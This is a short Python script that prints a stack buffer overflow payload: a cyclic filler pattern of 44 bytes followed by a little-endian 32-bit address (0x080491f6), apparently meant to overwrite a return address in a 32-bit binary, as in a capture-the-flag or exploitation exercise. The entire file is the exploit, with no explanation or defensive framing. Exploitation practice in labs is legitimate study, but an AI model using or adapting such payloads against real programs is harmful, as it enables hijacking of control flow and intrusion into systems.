#!/usr/bin/env python
import sys

payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08'

sys.stdout.buffer.write(payload)

